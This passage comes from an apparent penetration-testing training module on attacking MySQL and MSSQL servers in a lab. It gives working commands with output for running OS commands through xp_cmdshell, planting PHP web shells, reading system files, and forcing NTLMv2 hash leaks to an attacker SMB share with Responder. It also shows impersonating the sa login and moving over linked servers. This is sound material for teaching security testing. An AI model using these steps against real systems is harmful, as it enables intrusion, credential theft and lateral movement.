<pre><code class="lang-shell-session">mysql&gt; SHOW TABLES;

+----------------------------+
|<span class="hljs-string"> Tables_in_htbusers         </span>|
+----------------------------+
|<span class="hljs-string"> actions                    </span>|
|<span class="hljs-string"> permissions                </span>|
|<span class="hljs-string"> permissions_roles          </span>|
|<span class="hljs-string"> permissions_users          </span>|
|<span class="hljs-string"> roles                      </span>|
|<span class="hljs-string"> roles_users                </span>|
|<span class="hljs-string"> settings                   </span>|
|<span class="hljs-string"> users                      </span>|
+----------------------------+
8 rows in set (0.00 sec)
</code></pre>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session"><span class="hljs-meta">1&gt; </span>SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
<span class="hljs-meta">2&gt; </span>GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles      
roles_users
settings
users 
(<span class="hljs-number">8</span> rows affected)
</code></pre>
<p><strong>Select all Data from Table &quot;users&quot;</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-shell-session">mysql&gt; SELECT <span class="hljs-symbol">*</span> FROM users;

+----+---------------+------------+---------------------+
|<span class="hljs-string"> id </span>|<span class="hljs-string"> username      </span>|<span class="hljs-string"> password   </span>|<span class="hljs-string"> date_of_joining     </span>|
+----+---------------+------------+---------------------+
|<span class="hljs-string">  1 </span>|<span class="hljs-string"> admin         </span>|<span class="hljs-string"> p@ssw0rd   </span>|<span class="hljs-string"> 2020-07-02 00:00:00 </span>|
|<span class="hljs-string">  2 </span>|<span class="hljs-string"> administrator </span>|<span class="hljs-string"> adm1n_p@ss </span>|<span class="hljs-string"> 2020-07-02 11:30:50 </span>|
|<span class="hljs-string">  3 </span>|<span class="hljs-string"> john          </span>|<span class="hljs-string"> john123!   </span>|<span class="hljs-string"> 2020-07-02 11:47:16 </span>|
|<span class="hljs-string">  4 </span>|<span class="hljs-string"> tom           </span>|<span class="hljs-string"> tom123!    </span>|<span class="hljs-string"> 2020-07-02 12:23:16 </span>|
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
</code></pre>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session"><span class="hljs-meta">1&gt; </span>SELECT * FROM users
<span class="hljs-meta">2&gt; </span>go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          <span class="hljs-number">1</span> admin                p@ssw0rd         <span class="hljs-number">2020</span>-<span class="hljs-number">07</span>-<span class="hljs-number">02</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>
          <span class="hljs-number">2</span> administrator        adm1n_p@ss       <span class="hljs-number">2020</span>-<span class="hljs-number">07</span>-<span class="hljs-number">02</span> <span class="hljs-number">11</span>:<span class="hljs-number">30</span>:<span class="hljs-number">50.000</span>
          <span class="hljs-number">3</span> john                 john123!         <span class="hljs-number">2020</span>-<span class="hljs-number">07</span>-<span class="hljs-number">02</span> <span class="hljs-number">11</span>:<span class="hljs-number">47</span>:<span class="hljs-number">16.000</span>
          <span class="hljs-number">4</span> tom                  tom123!          <span class="hljs-number">2020</span>-<span class="hljs-number">07</span>-<span class="hljs-number">02</span> <span class="hljs-number">12</span>:<span class="hljs-number">23</span>:<span class="hljs-number">16.000</span>

(<span class="hljs-number">4</span> rows affected)
</code></pre>
<hr>
<h3 id="execute-commands">Execute Commands</h3>
<p><code>Command execution</code> is one of the most desired capabilities when attacking common services because it allows us to control the operating system. If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.</p>
<p><code>MSSQL</code> has a <a href="https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15">extended stored procedures</a> called <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">xp_cmdshell</a> which allow us to execute system commands using SQL. Keep in mind the following about <code>xp_cmdshell</code>:</p>
<ul>
<li><code>xp_cmdshell</code> is a powerful feature and disabled by default. <code>xp_cmdshell</code> can be enabled and disabled by using the <a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration">Policy-Based Management</a> or by executing <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option">sp_configure</a></li>
<li>The Windows process spawned by <code>xp_cmdshell</code> has the same security rights as the SQL Server service account</li>
<li><code>xp_cmdshell</code> operates synchronously. Control is not returned to the caller until the command-shell command is completed</li>
</ul>
<p>To execute commands using SQL syntax on MSSQL, use:</p>
<p><strong>XP_CMDSHELL</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session"><span class="hljs-meta">1&gt; </span>xp_cmdshell <span class="hljs-string">'whoami'</span>
<span class="hljs-meta">2&gt; </span>GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(<span class="hljs-number">2</span> rows affected)
</code></pre>
<p>If <code>xp_cmdshell</code> is not enabled, we can enable it, if we have the appropriate privileges, using the following command:</p>
<p>Code: mssql</p>
<pre><code class="lang-mssql"><span class="hljs-comment">-- To allow advanced options to be changed.  </span>
<span class="hljs-keyword">EXECUTE</span> sp_configure <span class="hljs-string">'show advanced options'</span>, <span class="hljs-number">1</span>
<span class="hljs-keyword">GO</span>

<span class="hljs-comment">-- To update the currently configured value for advanced options.  </span>
RECONFIGURE
<span class="hljs-keyword">GO</span>  

<span class="hljs-comment">-- To enable the feature.  </span>
<span class="hljs-keyword">EXECUTE</span> sp_configure <span class="hljs-string">'xp_cmdshell'</span>, <span class="hljs-number">1</span>
<span class="hljs-keyword">GO</span>  

<span class="hljs-comment">-- To update the currently configured value for this feature.  </span>
RECONFIGURE
<span class="hljs-keyword">GO</span>
</code></pre>
<p>There are other methods to get command execution, such as adding <a href="https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server">extended stored procedures</a>, <a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">CLR Assemblies</a>, <a href="https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15">SQL Server Agent Jobs</a>, and <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql">external scripts</a>. However, besides those methods there are also additional functionalities that can be used like the <code>xp_regwrite</code> command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.</p>
<p><code>MySQL</code> supports <a href="https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/">User Defined Functions</a> which allows us to execute C/C++ code as a function within SQL, there&#39;s one User Defined Function for command execution in this <a href="https://github.com/mysqludf/lib\_mysqludf\_sys">GitHub repository</a>. It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.</p>
<hr>
<h3 id="write-local-files">Write Local Files</h3>
<p><code>MySQL</code> does not have a stored procedure like <code>xp_cmdshell</code>, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose <code>MySQL</code> operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using <a href="https://mariadb.com/kb/en/select-into-outfile/">SELECT INTO OUTFILE</a> in the webserver directory. Then we can browse to the location where the file is and execute our commands.</p>
<p><strong>MySQL - Write Local File</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-shell-session">mysql&gt; SELECT "<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> shell_exec($_GET[<span class="hljs-string">'c'</span>]);<span class="hljs-meta">?&gt;</span></span>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
</code></pre>
<p>In <code>MySQL</code>, a global system variable <a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar\_secure\_file\_priv">secure_file_priv</a> limits the effect of data import and export operations, such as those performed by the <code>LOAD DATA</code> and <code>SELECT  INTO OUTFILE</code> statements and the <a href="https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function\_load-file">LOAD_FILE()</a> function. These operations are permitted only to users who have the <a href="https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv\_file">FILE</a> privilege.</p>
<p><code>secure_file_priv</code> may be set as follows:</p>
<ul>
<li>If empty, the variable has no effect, which is not a secure setting.</li>
<li>If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.</li>
<li>If set to NULL, the server disables import and export operations.</li>
</ul>
<p>In the following example, we can see the <code>secure_file_priv</code> variable is empty, which means we can read and write data using <code>MySQL</code>:</p>
<p><strong>MySQL - Secure File Privileges</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-shell-session">mysql&gt; show variables like "secure<span class="hljs-emphasis">_file_</span>priv";

<span class="hljs-code">+------------------+</span>-------+
<span class="hljs-section">| Variable_name    | Value |
+------------------+-------+</span>
<span class="hljs-section">| secure_file_priv |       |
+------------------+-------+</span>

1 row in set (0.005 sec)
</code></pre>
<p>To write files using <code>MSSQL</code>, we need to enable <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option">Ole Automation Procedures</a>, which requires admin privileges, and then execute some stored procedures to create the file:</p>
<p><strong>MSSQL - Enable Ole Automation Procedures</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session"><span class="hljs-meta">1&gt; </span>sp_configure <span class="hljs-string">'show advanced options'</span>, <span class="hljs-number">1</span>
<span class="hljs-meta">2&gt; </span>GO
<span class="hljs-meta">3&gt; </span>RECONFIGURE
<span class="hljs-meta">4&gt; </span>GO
<span class="hljs-meta">5&gt; </span>sp_configure <span class="hljs-string">'Ole Automation Procedures'</span>, <span class="hljs-number">1</span>
<span class="hljs-meta">6&gt; </span>GO
<span class="hljs-meta">7&gt; </span>RECONFIGURE
<span class="hljs-meta">8&gt; </span>GO
</code></pre>
<p><strong>MSSQL - Create a File</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session"><span class="hljs-meta">1&gt; </span>DECLARE @OLE INT
<span class="hljs-meta">2&gt; </span>DECLARE @FileID INT
<span class="hljs-meta">3&gt; </span>EXECUTE sp_OACreate <span class="hljs-string">'Scripting.FileSystemObject'</span>, @OLE OUT
<span class="hljs-meta">4&gt; </span>EXECUTE sp_OAMethod @OLE, <span class="hljs-string">'OpenTextFile'</span>, @FileID OUT, <span class="hljs-string">'c:\inetpub\wwwroot\webshell.php'</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>
<span class="hljs-meta">5&gt; </span>EXECUTE sp_OAMethod @FileID, <span class="hljs-string">'WriteLine'</span>, Null, <span class="hljs-string">'&lt;?php echo shell_exec($_GET["c"]);?&gt;'</span>
<span class="hljs-meta">6&gt; </span>EXECUTE sp_OADestroy @FileID
<span class="hljs-meta">7&gt; </span>EXECUTE sp_OADestroy @OLE
<span class="hljs-meta">8&gt; </span>GO
</code></pre>
<hr>
<h3 id="read-local-files">Read Local Files</h3>
<p>By default, <code>MSSQL</code> allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:</p>
<p><strong>Read Local Files in MSSQL</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session"><span class="hljs-meta">1&gt; </span>SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
<span class="hljs-meta">2&gt; </span>GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) <span class="hljs-number">1993</span>-<span class="hljs-number">2009</span> Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(<span class="hljs-number">1</span> rows affected)
</code></pre>
<p>As we previously mentioned, by default a <code>MySQL</code> installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:</p>
<p><strong>MySQL - Read Local Files in MySQL</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-shell-session">mysql&gt; select LOAD_FILE(<span class="hljs-string">"/etc/passwd"</span>);

+--------------------------+
| LOAD_FILE(<span class="hljs-string">"/etc/passwd"</span>)
+--------------------------------------------------+
<span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
<span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span>

&lt;SNIP&gt;
</code></pre>
<hr>
<h3 id="capture-mssql-service-hash">Capture MSSQL Service Hash</h3>
<p>In the <code>Attacking SMB</code> section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using <code>xp_subdirs</code> or <code>xp_dirtree</code> undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.</p>
<p>To make this work, we need first to start <a href="https://github.com/lgandx/Responder">Responder</a> or <a href="https://github.com/SecureAuthCorp/impacket">impacket-smbserver</a> and execute one of the following SQL queries:</p>
<p><strong>XP_DIRTREE Hash Stealing</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session"><span class="hljs-number">1</span>&gt; EXEC master..xp_dirtree '\\<span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.17</span>\share\'
<span class="hljs-number">2</span>&gt; GO

subdirectory    depth
--------------- -----------
</code></pre>
<p><strong>XP_SUBDIRS Hash Stealing</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session">1&gt; EXEC master..xp_subdirs '<span class="hljs-symbol">\\</span>10.10.110.17<span class="hljs-symbol">\s</span>hare<span class="hljs-symbol">\'</span>
2&gt; GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '<span class="hljs-symbol">\\</span>10.10.110.17<span class="hljs-symbol">\s</span>hare<span class="hljs-symbol">\*</span>.*': FindFirstFile() returned error 5, 'Access is denied.'
</code></pre>
<p>If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.</p>
<p><strong>XP_SUBDIRS Hash Stealing with Responder</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|<span class="hljs-string">  </span>|<span class="hljs-string">.-----.----.
  </span>|<span class="hljs-string">   _</span>|<span class="hljs-string">  -__</span>|<span class="hljs-string">__ --</span>|<span class="hljs-string">  _  </span>|<span class="hljs-string">  _  </span>|<span class="hljs-string">     </span>|<span class="hljs-string">  _  </span>||<span class="hljs-string">  -__</span>|<span class="hljs-string">   _</span>|
  |<span class="hljs-string">__</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_____</span>|<span class="hljs-string">_____</span>|<span class="hljs-string">   __</span>|<span class="hljs-string">_____</span>|<span class="hljs-string">__</span>|<span class="hljs-string">__</span>|<span class="hljs-string">_____</span>||<span class="hljs-string">_____</span>|<span class="hljs-string">__</span>|
                   |<span class="hljs-string">__</span>|<span class="hljs-string">              
&lt;SNIP&gt;

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000</span>
</code></pre>
<p><strong>XP_SUBDIRS Hash Stealing with impacket</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.<span class="hljs-number">9</span>.<span class="hljs-number">22</span> - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation
<span class="hljs-string">[*]</span> Config file parsed
<span class="hljs-string">[*]</span> Callback added for UUID 4B324FC8-<span class="hljs-number">1670</span>-01D3-<span class="hljs-number">1278</span>-5A47BF6EE188 V:<span class="hljs-number">3</span>.<span class="hljs-number">0</span>
<span class="hljs-string">[*]</span> Callback added for UUID 6BFFD098-A112-<span class="hljs-number">3610</span>-<span class="hljs-number">9833</span>-46C3F87E345A V:<span class="hljs-number">1</span>.<span class="hljs-number">0</span> 
<span class="hljs-string">[*]</span> Config file parsed                                                 
<span class="hljs-string">[*]</span> Config file parsed                                                 
<span class="hljs-string">[*]</span> Config file parsed
<span class="hljs-string">[*]</span> Incoming connection (<span class="hljs-number">10.129.203.7</span>,<span class="hljs-number">49728</span>)
<span class="hljs-string">[*]</span> AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
<span class="hljs-string">[*]</span> User WINSRV02\mssqlsvc authenticated successfully                        
<span class="hljs-string">[*]</span> demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
<span class="hljs-string">[*]</span> Closing down connection (<span class="hljs-number">10.129.203.7</span>,<span class="hljs-number">49728</span>)                      
<span class="hljs-string">[*]</span> Remaining connections <span class="hljs-string">[]</span>
</code></pre>
<hr>
<h3 id="impersonate-existing-users-with-mssql">Impersonate Existing Users with MSSQL</h3>
<p>SQL Server has a special permission, named <code>IMPERSONATE</code>, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let&#39;s explore how the <code>IMPERSONATE</code> privilege can lead to privilege escalation in SQL Server.</p>
<p>First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:</p>
<p><strong>Identify Users that We Can Impersonate</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session"><span class="hljs-meta">1&gt; </span>SELECT distinct b.name
<span class="hljs-meta">2&gt; </span>FROM sys.server_permissions a
<span class="hljs-meta">3&gt; </span>INNER JOIN sys.server_principals b
<span class="hljs-meta">4&gt; </span>ON a.grantor_principal_id = b.principal_id
<span class="hljs-meta">5&gt; </span>WHERE a.permission_name = <span class="hljs-string">'IMPERSONATE'</span>
<span class="hljs-meta">6&gt; </span>GO

name
-----------------------------------------------
sa
ben
valentin

(<span class="hljs-number">3</span> rows affected)
</code></pre>
<p>To get an idea of privilege escalation possibilities, let&#39;s verify if our current user has the sysadmin role:</p>
<p><strong>Verifying our Current User and Role</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session"><span class="hljs-meta">1&gt; </span>SELECT SYSTEM_USER
<span class="hljs-meta">2&gt; </span>SELECT IS_SRVROLEMEMBER(<span class="hljs-string">'sysadmin'</span>)
<span class="hljs-meta">3&gt; </span>go

-----------
julio                                                                                                                    

(<span class="hljs-number">1</span> rows affected)

-----------
          <span class="hljs-number">0</span>

(<span class="hljs-number">1</span> rows affected)
</code></pre>
<p>As the returned value <code>0</code> indicates, we do not have the sysadmin role, but we can impersonate the <code>sa</code> user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement <code>EXECUTE AS LOGIN</code> and set it to the user we want to impersonate.</p>
<p><strong>Impersonating the SA User</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session"><span class="hljs-meta">1&gt; </span>EXECUTE AS LOGIN = <span class="hljs-string">'sa'</span>
<span class="hljs-meta">2&gt; </span>SELECT SYSTEM_USER
<span class="hljs-meta">3&gt; </span>SELECT IS_SRVROLEMEMBER(<span class="hljs-string">'sysadmin'</span>)
<span class="hljs-meta">4&gt; </span>GO

-----------
sa

(<span class="hljs-number">1</span> rows affected)

-----------
          <span class="hljs-number">1</span>

(<span class="hljs-number">1</span> rows affected)
</code></pre>
<p>Note: It&#39;s recommended to run <code>EXECUTE AS LOGIN</code> within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn&#39;t have access to the DB you are connecting to it will present an error. Try to move to the master DB using <code>USE master</code>.</p>
<p>We can now execute any command as a sysadmin as the returned value <code>1</code> indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement <code>REVERT</code>.</p>
<p>Note: If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.</p>
<hr>
<h3 id="communicate-with-other-databases-with-mssql">Communicate with Other Databases with MSSQL</h3>
<p><code>MSSQL</code> has a configuration option called <a href="https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine">linked servers</a>. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.</p>
<p>If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let&#39;s see how we can identify and execute queries on linked servers.</p>
<p><strong>Identify linked Servers in MSSQL</strong></p>
<p>Attacking SQL Databases</p>
<pre><code class="lang-cmd-session"><span class="hljs-meta">1&gt; </span>SELECT srvname, isremote FROM sysservers
<span class="hljs-meta">2&gt; </span>GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          <span class="hljs-number">1</span>
<span class="hljs-number">10.0</span>.<span class="hljs-number">0.12</span>\SQLEXPRESS                <span class="hljs-number">0</span>

(<span class="hljs-number">2</span> rows affected)
</code></pre>
<p>As we can see in the query&#39;s output, we have the name of the server and the column <code>isremote</code>, where <code>1</code> means is a remote server, and <code>0</code> is a linked server. We can see <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql">sysservers Transact-SQL</a> for more information.</p>
<p>Next, we can attempt to identify the user used for the connection and its privileges. The <a href="https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql">EXECUTE</a> statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (<code>[ ]</code>).</p>
<pre><code class="lang-cmd-session"><span class="hljs-meta">1&gt; </span>EXECUTE(<span class="hljs-string">'select @@servername, @@version, system_user, is_srvrolemember('</span><span class="hljs-string">'sysadmin'</span><span class="hljs-string">')'</span>) AT [<span class="hljs-number">10.0</span>.<span class="hljs-number">0.12</span>\SQLEXPRESS]
<span class="hljs-meta">2&gt; </span>GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-<span class="hljs-number">0</span>L9D4KA\SQLEXPRESS     Microsoft SQL Server <span class="hljs-number">2019</span> (RTM sa_remote                                <span class="hljs-number">1</span>

(<span class="hljs-number">1</span> rows affected)
</code></pre>
<h2 id="latest-sql-vulnerabilities">Latest SQL Vulnerabilities</h2>
<hr>
<p>This time let&#39;s discuss a vulnerability that does not have a CVE and does not require a direct exploit. The previous section shows that we can get the <code>NTLMv2</code> hashes by interacting with the MSSQL server. However, we should mention again that this attack is possible through a direct connection to the MSSQL server and vulnerable web applications. However, we will only focus on the simpler variant for the time being, namely the direct interaction.</p>
<hr>
<h3 id="the-concept-of-the-attack">The Concept of the Attack</h3>
<p>We will focus on the undocumented MSSQL server function called <code>xp_dirtree</code> for this vulnerability. This function is used to view the contents of a specific folder (local or remote). Furthermore, this function provides some additional parameters that can be specified. These include the depth, how far the function should go in the folder, and the actual target folder.</p>
<p><strong>The Concept of Attacks</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/attack\_concept2.png" alt=""></p>
<p>The interesting thing is that the MSSQL function <code>xp_dirtree</code> is not directly a vulnerability but takes advantage of the authentication mechanism of SMB. When we try to access a shared folder on the network with a Windows host, this Windows host automatically sends an <code>NTLMv2</code> hash for authentication.</p>
<p>This hash can be used in various ways against the MSSQL server and other hosts in the corporate network. This includes an SMB Relay attack where we &quot;replay&quot; the hash to log into other systems where the account has local admin privileges or <code>cracking</code> this hash on our local system. Successful cracking would allow us to see and use the password in cleartext. A successful SMB Relay attack would grant us admin rights on another host in the network, but not necessarily the host where the hash originated because Microsoft patched an older flaw that allowed an SMB Relay back to the originating host. We could, however, possibly gain local admin to another host and then steal credentials that could be re-used to gain local admin access to the original system where the NTLMv2 hash originated from.</p>
<p><strong>Initiation of the Attack</strong></p>
<table>
<thead>
<tr>
<th><strong>Step</strong></th>
<th><strong>XP_DIRTREE</strong></th>
<th><strong>Concept of Attacks - Category</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>1.</code></td>
<td>The source here is the user input, which specifies the function and the folder shared in the network.</td>
<td><code>Source</code></td>
</tr>
<tr>
<td><code>2.</code></td>
<td>The process should ensure that all contents of the specified folder are displayed to the user.</td>
<td><code>Process</code></td>
</tr>
<tr>
<td><code>3.</code></td>
<td>The execution of system commands on the MSSQL server requires elevated privileges with which the service executes the commands.</td>
<td><code>Privileges</code></td>
</tr>
<tr>
<td><code>4.</code></td>
<td>The SMB service is used as the destination to which the specified information is forwarded.</td>
<td><code>Destination</code></td>
</tr>
</tbody>
</table>
<p>This is when the cycle starts all over again, but this time to obtain the NTLMv2 hash of the MSSQL service user.</p>
<p><strong>Steal The Hash</strong></p>
<table data-header-hidden><thead><tr><th width="110"></th><th width="309"></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>Stealing the Hash</strong></td><td><strong>Concept of Attacks - Category</strong></td></tr><tr><td><code>5.</code></td><td>Here, the SMB service receives the information about the specified order through the previous process of the MSSQL service.</td><td><code>Source</code></td></tr><tr><td><code>6.</code></td><td>The data is then processed, and the specified folder is queried for the contents.</td><td><code>Process</code></td></tr><tr><td><code>7.</code></td><td>The associated authentication hash is used accordingly since the MSSQL running user queries the service.</td><td><code>Privileges</code></td></tr><tr><td><code>8.</code></td><td>In this case, the destination for the authentication and query is the host we control and the shared folder on the network.</td><td><code>Destination</code></td></tr></tbody></table>

<p>Finally, the hash is intercepted by tools like <code>Responder</code>, <code>WireShark</code>, or <code>TCPDump</code> and displayed to us, which we can try to use for our purposes. Apart from that, there are many different ways to execute commands in MSSQL. For example, another interesting method would be to execute Python code in a SQL query. We can find more about this in the <a href="https://docs.microsoft.com/en-us/sql/machine-learning/tutorials/quickstart-python-create-script?view=sql-server-ver15">documentation</a> from Microsoft. However, this and other possibilities of what we can do with MSSQL will be discussed in another module.</p>
<h2 id="attacking-rdp">Attacking RDP</h2>
<hr>
<p><a href="https://en.wikipedia.org/wiki/Remote\_Desktop\_Protocol">Remote Desktop Protocol (RDP)</a> is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection. It is also one of the most popular administration tools, allowing system administrators to centrally control their remote systems with the same functionality as if they were on-site. In addition, managed service providers (MSPs) often use the tool to manage hundreds of customer networks and systems. Unfortunately, while RDP greatly facilitates remote administration of distributed IT systems, it also creates another gateway for attacks.</p>
<p>By default, RDP uses port <code>TCP/3389</code>. Using <code>Nmap</code>, we can identify the available RDP service on the target host:</p>
<p>Attacking RDP</p>
<pre><code class="lang-shell-session">root@htb[/htb]# <span class="hljs-keyword">nmap</span> -Pn -p3389 <span class="hljs-number">192.168</span>.<span class="hljs-number">2.143</span> 

Host discovery disabled (-Pn). All addresses will <span class="hljs-keyword">be</span> marked <span class="hljs-string">'up'</span>, <span class="hljs-built_in">and</span> scan times will <span class="hljs-keyword">be</span> slower.
Starting Nmap <span class="hljs-number">7.91</span> ( http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2021</span>-<span class="hljs-number">08</span>-<span class="hljs-number">25</span> <span class="hljs-number">04</span>:<span class="hljs-number">20</span> BST
